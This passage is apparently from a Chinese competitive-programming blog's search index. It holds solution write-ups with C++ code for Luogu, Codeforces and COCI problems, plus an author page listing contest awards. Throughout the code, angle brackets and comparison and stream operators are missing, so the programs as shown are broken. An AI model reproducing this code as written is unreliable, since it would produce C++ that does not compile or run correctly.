q.front ();q.pop (); ans = min (ans,abs (m - now.dx - now.dy));//更新最优答案 |m - m| //若此情况没有出现过，则加入队列中 //装满 if (!vis[x][now.dy]) milk.push (x,now.dy),vis[x][now.dy] = 1; if (!vis[now.dx][y]) milk.push (now.dx,y),vis[now.dx][y] = 1; //倒空 if (!vis[now.dx][0]) milk.push (now.dx,0),vis[now.dx][0] = 1; if (!vis[0][now.dy]) milk.push (0,now.dy),vis[0][now.dy] = 1; //互相倒 if (!vis[now.dx - min (now.dx,y - now.dy)][min (y,now.dy + now.dx)]) milk.push (now.dx - min (now.dx,y - now.dy),min (y,now.dy + now.dx)),vis[now.dx - min (now.dx,y - now.dy)][min (y,now.dy + now.dx)] = 1; if (!vis[min (x,now.dx + now.dy)][now.dy - min (now.dy,x - now.dx)]) milk.push (min (x,now.dx + now.dy),now.dy - min (now.dy,x - now.dx)),vis[min (x,now.dx + now.dy)][now.dy - min (now.dy,x - now.dx)] = 1; while (!milk.empty ()) q.push (milk.front ()),milk.pop ();//将所有可能放入 q 中 search (num + 1); $\\texttt{end:}$ 注意一下递归的边界！！！if (num == k + 1) return ; 写成 if (num == k) return ; 调了我好久啊 $\\texttt{qwq}$！","categories":["Solution"]},{"title":"题解：P6606 [Code+#7]最小路径串","path":"/2020/06/12/P6606/","content":"这道题目其实是一道搜索题目，但需要注意，所要查找的答案并不是要最小而是满足路径上所有点的数字串顺次连接形成的串的字典序最小。 因此我们便可以从一个点开始，找到连接该点的最小数字串。举个例子： $000001\\begin{cases}000002\\begin{cases}000008\\\\000007\\end{cases}\\\\000003\\\\000006\\begin{cases}000004\\\\000005\\end{cases}\\end{cases}$ 我们所得的最佳路径为 000001-000002-000007。用 vector 来储存边的值，存储完后将它进行从小到大排序，然后再进行搜索，每次找到相邻边的第一个未更新过的点，然后将其记录在答案之中。(为什么是第一个呢？因为在之前已排过序，所以第一个未更新的点一定是当前答案的最优解！) 最后就是如何记录答案，我们用 ans[i] 储存 $0$ 至 $i$ 的最优解，然后搜索得到的新点可以用 (nowans * 1000000 + next) % mod 记录，再举一个例子：$000002 -000005$ 就是 $ 2 \\times 10^6 + 5$。 注意：这相当于一张无向图，且包含了重边与自环。因此在处理的时候要注意这类特殊的情况。 最后是代码： #include iostream#include vector#include algorithm#include cstring#define INF 0x3f3f3f3f#define MOD 998244353#define ll long long#define MAX 2000005using namespace std;vector ll e[MAX];ll ans[MAX]; bool cmp(int x,int y) return x y;void dfs(int st,ll s);int main() int n,m; cinnm; memset(ans,-1,sizeof(ans));//初始化 for(int i = 1;i = m;++i) int a = 0,b = 0;char x; for(int j = 1;j = 6;++j) cinx,a = a * 10 + x - 0; for(int j = 1;j = 6;++j) cinx,b = b * 10 + x - 0; if(a != b)//不为重边 e[a].push_back(b),e[b].push_back(a);//无向边 for(int i = 0;i n;++i) sort(e[i].begin(),e[i].end(),cmp);//排序 dfs(0,0); for(int i = 1;i n;++i) coutans[i]endl; return 0;void dfs(int st,ll s) ans[st] = s;//更新答案 for(int i = 0;i e[st].size();++i) if(ans[e[st][i]] == -1)//未更新过--未到过 dfs(e[st][i],(s * 1000000 + e[st][i]) % MOD);//取模","categories":["Solution"]},{"title":"题解：P6682 座位调查","path":"/2020/05/31/P6682/","content":"条形座位的定义：在 $n$ 个座位中有 $2$ 个座位只有一个相邻的座位(为端点) 其余 $n - 2$ 个座位均有两个相邻的座位。($n = 1$ 时也算) $\\texttt{subtask 1-3}$即为$n = 1$ 的情况，说明只有一行，因此一定是条形座位。那么我们只需要根据乘法原理将每组条形座位的方案相乘即可。 那么每组条形座位的方案如何计算呢？还是乘法原理！我们先回顾一下选座位的要求：任意考生不可能和来自同学校的考生座位相邻。那么对于 $k$ 个学校的学生与一个长度为 $m$ 的条形座位。[$k \\ge 2$] 第一个位置肯定有 $k$ 种情况；第二个座位的学生与第一个的来自不同的学校，所以只有 $k - 1$ 种情况；第三个座位的学生与第二个的来自不同的学校，但可以与第一个的来自相同的学校，所以仍然有 $k - 1$ 种情况。 综上所述，上面的一组条形座位的方案数为 $k \\times (k - 1) ^ {n - 1}$ $[k \\ge2]$。根据这个，我们就可以得到 $40pts$ 的代码： #include iostream#define MOD 998244353 using namespace std;char a[1005][1005];int an[1005];int main() int n,m,k,w = 0;long long ans = 1;//long long！！！ cinnmk; for(int i = 1;i = n;++i) for(int j = 1;j = m;++j) cina[i][j]; for(int i = 1;i = m;i++) if(a[1][i] == O a[1][i - 1] != O) an[++w]++;//新的条形座位 else if(a[1][i] == O) an[w]++;//座位的长度增加 for(int i = 1;i = w;i++) long long num = k; for(int j = 2;j = an[i];j++) num *= k - 1,num %= MOD;//计算与取模 ans *= num;ans %= MOD;//答案累计取模 coutansendl; return 0; $\\texttt{subtask 4，5}$我们将上面的思路由一维扩展到二维，发现我们只要进行一次搜索进行连通块数量的统计就行了。 需要多开一个 vis[1005][1005] 的数组，用于记录该点是否到达过。每一个连通块的大小都要单独计算，因此在搜索完毕后会得到若干个大小不同的条形座位，分别经过上述公式计算后相乘即可得出答案。$80pts$ 的代码如下： #include iostream#define MOD 998244353 #define MAX 1005#define ll long longusing namespace std;char a[MAX][MAX];ll an[MAX],ans = 1;bool vis[MAX][MAX];int dx[4] = 1,-1,0,0,dy[4] = 0,0,1,-1,n,m,k,w;void search(int x,int y);int main() cinnmk; for(int i = 1;i = n;++i) for(int j = 1;j = m;++j) cina[i][j]; for(int i = 1;i = n;++i) for(int j = 1;j = m;++j) if(!vis[i][j] a[i][j] == O) w++,search(i,j); for(int i = 1;i = w;++i)//计算 ll sum = k; for(int j = 2;j = an[i];++j) sum *= k - 1,sum %= MOD; ans *= sum,ans %= MOD; coutansendl; return 0;void search(int x,int y) vis[x][y] = 1;an[w]++;//标记已经到过，答案加1 for(int i = 0;i 4;++i) int xx = x + dx[i],yy = y + dy[i]; if(1 = xx 1 = yy xx = n y = m !vis[xx][yy] a[xx][yy] == O) search(xx,yy);//搜索 $\\texttt{subtask 6}$可能出现不是条形座位的情况，因此我们需要判断每个连通块是否合法。若不合法，就要特判输出 $0$ 。那么我们如何去检查呢？ 我们可以开一个队列：每次搜索计数一个连通块时，搜索到一个新的点时，把该点的坐标记录到队列中去。在搜索完毕后，进行统一的检查。不断取出队列中的元素，若不满足只有 $2$ 个相邻座位数为 $1$ 的点且其余座位的相邻座位数均为 $2$，就说明不满足条件，输出 $0$ 并停止程序。需要注意的是，只有一个座位的情况需要额外的特判。 综上所述，我们就得到了 $100pts$ 的代码： #include iostream#include queue#define MOD 998244353 #define MAX 1005#define ll long longusing namespace std;struct node int x,y;;queue node q;char a[MAX][MAX];ll an[MAX],ans = 1;bool vis[MAX][MAX];int dx[4] = 1,-1,0,0,dy[4] = 0,0,1,-1,num[MAX][MAX],n,m,k,w;void search(int x,int y);bool check();int main() cinnmk; for(int i = 1;i = n;++i) for(int j = 1;j = m;++j) cina[i][j]; for(int i = 1;i = n;++i) for(int j = 1;j = m;++j) if(!vis[i][j] a[i][j] == O) w++;search(i,j); if(!check()) cout0endl; return 0; for(int i = 1;i = w;++i) ll sum = k; for(int j = 2;j = an[i];++j) sum *= k - 1,sum %= MOD; ans *= sum,ans %= MOD; coutansendl; return 0;void search(int x,int y) q.push(x,y); vis[x][y] = 1;an[w]++; for(int i = 0;i 4;++i) int xx = x + dx[i],yy = y + dy[i]; if(1 = xx 1 = yy xx = n y = m !vis[xx][yy] a[xx][yy] == O) search(xx,yy); bool check() int tt = 0; if(q.size() == 1) q.pop(); return 1;//特判 while(!q.empty())//检查 int t = 0; node ch = q.front();q.pop(); if(a[ch.x][ch.y - 1] == O) t++; if(a[ch.x][ch.y + 1] == O) t++; if(a[ch.x - 1][ch.y] == O) t++; if(a[ch.x + 1][ch.y] == O) t++; if(t == 1) tt++; if(t 2) return 0;//相邻座位大于2 //coutch.x ch.y tendl; if(tt == 2) return 1;//相邻座位只有1的点恰好只有2个 else return 0;","categories":["Solution"]},{"title":"题解：CF1345A Puzzle Pieces","path":"/2020/05/30/CF1345A/","content":"由题目可知，若 $n = 1$ 或者 $m = 1$，一定可以像样例 $1$ 一样可以拼出来。以 $n = 1$ 为例，做法如下：凹口分别向右，下，左，左……左（共 $n - 2$ 个左）。 再来分析其它的，发现 $n = 2,m = 2$ 时为样例 $2$ 时有解，而当 $n = 2,m = 3$ 时是其它更大的模型的基础，但尝试后发现这个无法拼出。所以只有两种情况有解，代码如下： #include iostreamusing namespace std;int main() int t,a,b; cint; while(t--) cinab; if(a == 2 b == 2 ||a == 1 || b == 1) coutYesendl; else coutNoendl; return 0;","categories":["Solution"]},{"title":"题解：P1469 找筷子","path":"/2020/05/15/P1469/","content":"阅读题目，有这句话：这些筷子中只有一只筷子是落单的，其余都成双。因此我们由这句话可以受到一些启发。再看题目的内存限制，只有 4MB，所以对空间有了很大的要求。 根据题意，我们需要找到落单的筷子，那么如何进行成双的配对呢？很简单，就是异或。两个相同的数 x^x 的值一定为 $0$。所以我们只需要从 $1$ 至 $n$ 扫一遍，进行异或 ans ^= x。若第 $x$ 个数的长度已经配对，那么这个数将与之前的某个数得到 $0$ 的结果，则最后 ans 的值也就是落单的筷子的长度了。 注意：数据读入对程序效率造成的影响！ 因此我们在程序设计时使用快读，代码如下： #include iostream#include cstdiousing namespace std;inline int read();int main() int n,x,ans = 0; n = read(); for(register int i = 1;i = n;++i) x = read(),ans ^= x; printf(%d ,ans); return 0;inline int read() long long s = 0,f = 1; char ch = getchar(); while((ch 0 || ch 9) ch != EOF) if(ch == -) f = -1; ch = getchar(); while(ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar(); return s * f;","categories":["Solution"]},{"title":"题解：P6547 [COCI2010-2011#2] NAPOR","path":"/2020/05/15/P6547/","content":"刚开始做这道题，最先想到的便是字符串与 int 之间的转换。 对于第 $n_i$ 行整行输入，若输入数字，则需要在下一个不是数字的位置的地方记录，然后把所得数字加入答案中。当然，答案为 ans = ans * 10 + str[i] - 0。同时，题目中的 他还必须省略文本中数字可能包含的任何前导零 这句话十分关键，因此数字 $0$ 需要特判。最后，因为 在文本中找到所有数字，并以不降序的顺序输出，所以需要进行一次排序。 于是我们就得到了以下这个代码： #include iostream#include string#include algorithmusing namespace std;const int MAX = 550;int a[MAX];int main() int n,k = 0,tmp; string str; cinn; for(int i = 1;i = n;i++) cinstr;tmp = 0;//初始化 bool ok = 0;//数字有无出现 for(int j = 0;j str.size();j++) if(0 = str[j] str[j] = 9) tmp = tmp * 10 + str[j] - 0,ok = 1;//数字出现 else if(ok) a[++k] = tmp;//加入答案 tmp = 0,ok = 0;//清零 if(ok) a[++k] = tmp;//加入答案 sort(a + 1,a + k + 1);//排序 for(int i = 1;i = k;i++) couta[i]endl; return 0; 当然，这个思路也许只能过 $1-2$ 个测试点，原因很简单 每个字符串长度不超过 100，因此当该字符串全部为数字时，肯定会爆 long long。那么如何解决呢？ 全部都使用字符串来记录数字！ 把所得的数字加入答案中，这次的加法与上面不一样，因为都是字符串，所以我们只要 ans += str[i]。 同时，前导 $0$ 的出现同样是关键，我们以题目中的样例 $3$ 为例，我们在这 $n$ 行全部输入完毕后，会依次得到这几个数字：01 02 007 03 04 000。所以我们在排序之前需要删除前导 $0$，当然，答案为 $0$ 的情况我们依然要注意，核心代码(有注释)： for(int i = 1;i = k;i++)//删去前导0 tmp = ;bool ok = 0;//初始化 for(int j = 0;j a[i].size();j++)//依次枚举 if(a[i][j] != 0) ok = 1;//第一个不为0的数字 if(ok) tmp += a[i][j];//记录有效数位 if(ok) a[i] = tmp;//赋值 else a[i] = 0;//为0的特殊情况 经过处理，这几个数字就变成了：1 2 7 3 4 0。于是乎，接下去就是排序了。排序时是将两个字符串进行比较，所以需要一个 bool cmp(string x,string y) 函数。这两个字符串所组成的数有两种情况(为表示方便，以下 string x 的长度为 $sx$，string y的长度为 $sy$)： ① $sx = sy$ 数位相同，我们需要逐一进行比较，即 return x y;② $sx eq sy$ 数位不同，更加方便，直接比较数位大小，即 return sx sy; 经过这样的分析，最后我们排序后只需要逐一输出即可，一行一个。最后是 AC 代码： #include iostream#include string#include algorithmusing namespace std;const int MAX = 550;string a[MAX];bool cmp(string x,string y) if(x.size() != y.size()) return x.size() y.size();//数位不同 else return x y;//数位相同 int main() int n,k = 0; string str,tmp; cinn; for(int i = 1;i = n;i++) cinstr;tmp = ;//初始化 bool ok = 0;//数字有无出现 for(int j = 0;j str.size();j++) if(0 = str[j] str[j] = 9) tmp += str[j],ok = 1;//数字出现 else if(ok) a[++k] = tmp;//加入答案 tmp = ,ok = 0;//清0 if(ok) a[++k] = tmp;//加入答案 for(int i = 1;i = k;i++)//删去前导0 tmp = ;bool ok = 0;//初始化 for(int j = 0;j a[i].size();j++)//依次枚举 if(a[i][j] != 0) ok = 1;//第一个不为0的数字 if(ok) tmp += a[i][j];//记录有效数位 if(ok) a[i] = tmp;//赋值 else a[i] = 0;//为0的特殊情况 sort(a + 1,a + k + 1,cmp); for(int i = 1;i = k;i++) couta[i]endl; return 0;","categories":["Solution"]},{"title":"题解：[QkOI#R1] Quark and Equations","path":"/2020/05/04/P6511/","content":"这道题给定 $n,m$，要求方程组的解的数量。若无解，则输出 $0$。 $\\texttt{Subtask 1}$ 直接两层循环，从 $1$ 至 $\\max(n,m)$ 枚举 $i,j$，若满足条件，则将答案 $+1$。 $\\texttt{Subtask 2}$ 由方程组的 $i + j = n$ 可知 $i = n - j$，也就是说对于一个 $i$ 都会有一个对应的 $j$，因此可以化简为一层循环。 $\\texttt{Subtask 3-5}$ 当 $m = 1$时，$\\lfloor \\dfrac{i}{j} \\rfloor + \\lceil \\dfrac{j}{i} \\rceil = 1$。由题知，$i 0,j 0$，则 $\\lfloor\\dfrac{i}{j}\\rfloor =0,\\lceil\\dfrac{j}{i}\\rceil =1$，即 $j i$ 且 $j \\le i$,显然此时无解。 而当 $m n$ 或 $m \\in[n - 1,n]$ 时，同理能证得无解。 $\\texttt{subtask 6}$ 最后来看正解，对 $i,j$进行分类讨论。 $i j$，$\\lfloor \\dfrac{i}{j} \\rfloor = 0$，即 $\\lceil \\dfrac{j}{i} \\rceil = m$。 $i \\ge j$，$\\lceil \\dfrac{j}{i} \\rceil= 1$，即 $\\lfloor \\dfrac{i}{j} \\rfloor = m + 1$。 联立两式，于是我们就能得到两个不等式，整理可得最终答案为：$\\lceil \\dfrac{n - 1}{m} \\rceil - \\lceil \\dfrac{n - 1}{m + 1} \\rceil + \\lceil \\dfrac{n}{m} \\rceil - \\lceil \\dfrac{n}{m + 1} \\rceil$。 代码：注意特判哦！ #include bits/stdc++.husing namespace std;int main() int t; scanf(%d,t); while(t--) long long ans = 0,n,m;scanf(%lld%lld,n,m); if(m == 1) cout0endl; continue; ans = floor((n - 1) / m) - floor((n - 1) / (m + 1)) + floor(n / m) - floor(n / (m + 1)); printf(%lld ,ans); return 0;","categories":["Solution"]},{"title":"题解：P6460 [COCI2006-2007#5] NATRIJ","path":"/2020/04/24/P6460/","content":"我们运用字符串来输入这两个时间点。那么所输入的一个时间的字符长度为 $8$（XX:XX:XX）。那么我们把两个时间统一单位为秒钟后作差，然后再进行求解。那么我们设输入的一个字符串为 str，再分别来看时分秒。 时：(str[0] - 0) * 10 + str[1] - 0 分：(str[3] - 0) * 10 + str[4] - 0 秒：(str[6] - 0) * 10 + str[7] - 0 然后将这些内容分别 $\\times 3600,60,1$ 则能得到统一单位的时间和。然后我们将两者作差。则会有 $3$ 种情况： str_end - str_start 0，直接进行转换输出即可。 str_end - str_start == 0，由题可知正好为 $24$ 个小时，需要特判输出。 str_end - str_start 0，即跨了一天,需要加上 $24$ 个小时（也就是 $24 \\times 3600$ 秒）。 最后就是输出了，记得输出 $0$ 的特殊情况，在此不赘述。代码如下： #include bits/stdc++.husing namespace std;int main() string a,b;int ans = 0; cinab; //start与end的时间求和（单位：秒） int timea = ((a[0] - 0) * 10 + a[1] - 0) * 3600 + ((a[3] - 0) * 10 + a[4] - 0) * 60 + ((a[6] - 0) * 10 + a[7] - 0); int timeb = ((b[0] - 0) * 10 + b[1] - 0) * 3600 + ((b[3] - 0) * 10 + b[4] - 0) * 60 + ((b[6] - 0) * 10 + b[7] - 0); ans = timeb - timea;//作差 if(timea == timeb)//特判 cout24:00:00endl; return 0; if(timea timeb) ans += 24 * 3600;//隔了一天 //换算输出，注意0的情况 if(ans / 3600 10) cout0; coutans / 3600:; if(ans % 3600 / 60 10) cout0; coutans % 3600 / 60:; if(ans % 3600 % 60 10) cout0; coutans % 3600 % 60endl; return 0;","categories":["Solution"]},{"title":"题解：P6427 [COCI2008-2009#1] PTICE","path":"/2020/04/19/P6427/","content":"首先先要得出这三个人的循环节，分别为：ABC，BABC与 CCAABB。然后就用这三个不同的循环节去比较正确答案。其中需要注意的是，在得出最高的正确数后，还要判断有几个人都获得了最高的分数，也就是说，输出的姓名不只 $1$ 个，这一点需要额外注意。 #include bits/stdc++.husing namespace std;int main() int n,ans[3],num = 0;string str,d[3] = ABC,BABC,CCAABB,name[3] = Adrian,Bruno,Goran; cinnstr; for(int i = 0;i 3;i++) ans[i] = 0;//每个人的答案初始化 for(int j = 0;j = str.size() - 1;j++) if(str[j] == d[i][j % d[i].size()]) ans[i]++;//依次比较循环节 num = max(num,ans[i]);//记录最高的正确数量 coutnumendl; for(int i = 0;i 3;i++)//可能不只一个 if(ans[i] == num) coutname[i]endl; return 0;","categories":["Solution"]},{"title":"题解：P6352 [COCI2007-2008#3] CETIRI","path":"/2020/04/10/P6352/","content":"给出的三个数可能有两种情况（设四个数为 $ABCD$）： 已经为等差数列，这个很好判断。已经给出了 $ABC$，则 $D$ 等于 $A-B$ 或 $B-C$，则 $D$ 可以等于 $A-D$ 或 $C+D$。 此时未成为等差数列，即 $A - B eq B - C$，若增加一个数成为等差数列，必定有 $A D C$，所以我们只要判断 $D$ 应该再 $AB$ 之间还是 $BC$ 直接。大家一定能想到 $D$ 一定需要放在两数之差大的地方才可能有解，因此就有：$\\begin{cases}A-BB-C,D=A+\\frac{B-A}{2}\\\\A-BB-C,D=B+\\frac{C-B}{2}\\\\\\end{cases}$ 当然，以上先要对这三个数先排序，因为其余的三个数的顺序被打乱了。代码如下： #include iostream#include algorithmusing namespace std;int main() int a[4]; cina[1]a[2]a[3]; sort(a + 1,a + 4); if(a[2] - a[1] == a[3] - a[2]) couta[3] + (a[2] - a[1])endl; if(a[2] - a[1] a[3] - a[2]) couta[1] + (a[2] - a[1]) / 2endl; if(a[2] - a[1] a[3] - a[2]) couta[2] + (a[3] - a[2]) / 2endl; return 0;","categories":["Solution"]},{"title":"题解：P6330 [COCI2007-2008#1] CETVRTA","path":"/2020/04/09/P6330/","content":"首先大家需要知道什么是矩形，如下图所示。矩形是四个角均为 90 度的特殊的平行四边形。既然是平行四边形，那么一定对边平行且相等，即 $AB = CD$ 且 $AB \\parallel CD$，$AD = BC$ 且 $AD\\parallel BC$。那么就有 $A$ 与 $D$，$B$ 与 $C$ 的 $x$ 轴坐标相等；$A$ 与 $B$，$C$ 与 $D$ 的 $y$ 轴坐标相等。那么就有，输入的三个数中，找出单独未配对的点 $x$ 坐标与 $y$ 坐标，输出即可。 #include iostreamusing namespace std;int main() int x1,y1,x2,y2,x3,y3; cinx1y1x2y2x3y3; if(x1 == x2) coutx3 ; if(x1 == x3) coutx2 ; if(x2 == x3) coutx1 ; if(y1 == y2) couty3endl; if(y1 == y3) couty2endl; if(y2 == y3) couty1endl; return 0; 不知道大家看到找未配对的数后有什么联想？提示：两个相同的数进行异或值为 $0$。 因此就可以把 $x$ 与 $y$ 分别异或，那么配对的数值为 $0$，剩下的答案也就是要输出的数了。 #include iostreamusing namespace std;int main() int x,y,ansx = 0,ansy = 0; for(int i = 1;i = 3;i++) cinxy,ansx ^= x,ansy ^= y; coutansx ansyendl; return 0;","categories":["Solution"]},{"title":"题解：P6315 [COCI2006-2007#3] NPUZZLE","path":"/2020/04/08/P6315/","content":"这道题目的前置知识，曼哈顿距离，即为：$|x_1 - x_2| + |y_1 - y_2|$。这是原来字母的标准位置，我们可以用一个结构体储存这几个字母的坐标，下标从 $0$ 开始。 struct letter int x,y;a[15] = 1,1,1,2,1,3,1,4,2,1,2,2,2,3,2,4,3,1,3,2,3,3,3,4,4,1,4,2,4,3;//std 接下去是输入，用两层循环 for(int i = 1;i = 4;i++) 与 for(int j = 1;j = 4;j++)，$i$ 和 $j$ 正好表示输入的字母的坐标。我们现在要求的是所有字母从当前位置到自己的标准位置的曼哈顿距离之和，因此输入的.不需要被计算。那么这样只需要把 $i$ 与 $j$ 分别与该字母的标准进行比较求和就可以了。（注意：$\\texttt{A}$ 的 $\\text{ASCII}$ 的值等于 $65$，标准的下标从 $0$ 开始） #include iostream#include cmathusing namespace std;struct letter int x,y;a[15] = 1,1,1,2,1,3,1,4,2,1,2,2,2,3,2,4,3,1,3,2,3,3,3,4,4,1,4,2,4,3;//std int main() int ans = 0;char ch; for(int i = 1;i = 4;i++) for(int j = 1;j = 4;j++) cinch; if(ch != .) ans += abs(a[ch - 65].x - i) + abs(a[ch - 65].y - j);//A的ASCII值为65 coutansendl; return 0;","categories":["Solution"]},{"title":"题解：P6321 [COCI2006-2007#4] SKENER","path":"/2020/04/08/P6321/","content":"按照题意进行输出： 对于每一行的第 $c_j$ 个字母，都要输出 $zc$ 遍。 对于每一行，都要输出 $zr$ 遍。 所以就有了四重大循环，如下：#include iostreamusing namespace std;int main() char a[55][55]; int r,c,zr,zc; cinrczrzc; for(int i = 0;i r;i++) for(int j = 0;j c;j++) cina[i][j]; for(int i = 0;i r;i++) for(int k = 0;k zr;k++) for(int j = 0;j c;j++) for(int l = 0;l zc;l++) couta[i][j]; coutendl; return 0; 当然，因为每一行中有 $r$ 组字母都重复出现了 $zc$ 次，每一行都重复出现了 $zr$ 次，所以还可以再化简一下，如下：#include iostreamusing namespace std;int main() char a[55][55]; int r,c,zr,zc; cinrczrzc; for(int i = 0;i r;i++) for(int j = 0;j c;j++) cina[i][j]; for(int i = 0;i r * zr;i++) for(int j = 0;j c * zc;j++) couta[i / zr][j / zc];//注意这里 coutendl; return 0;","categories":["Solution"]},{"title":"About Me","path":"/Myself/index.html","content":"Self-IntroductionMy Github超闻逸事 EducationPrimaryJunior HighSenior HighUniverisity Programming Competition废物生成器的 CF/AT 佬们的 CF 获奖信息 比赛年份 比赛名称 奖项 2021 NOIP 二等 2022 NOIP 二等 2023 NOIP 一等 2025 「华为杯」第 50 届 ICPC 国际大学生程序设计竞赛区域赛南京站 银牌 2025 「华为杯」第 50 届 ICPC 国际大学生程序设计竞赛区域赛武汉站 银牌 2025 第 11 届 CCPC 中国大学生程序设计竞赛重庆站 铜牌 .award-info { padding: 20px; max-width: 800px; margin: 0 auto; } .prize-table { width: 100%; border-collapse: collapse; margin: 20px 0; } .prize-table th, .prize-table td { padding: 12px 15px; border: 1px solid #ddd; text-align: left; } .prize-table th { background-color: #f5f5f5; font-weight: bold; } .prize-table tr:nth-child(even) { background-color: #f9f9f9; } .prize-table tr:hover { background-color: #f0f0f0; } .note { font-size: 12px; color: #666; margin-top: 10px; font-style: italic; }"},{"title":"My Favorite","path":"/favorite/index.html","content":"FriendsJr-zlwSkyzhou"}]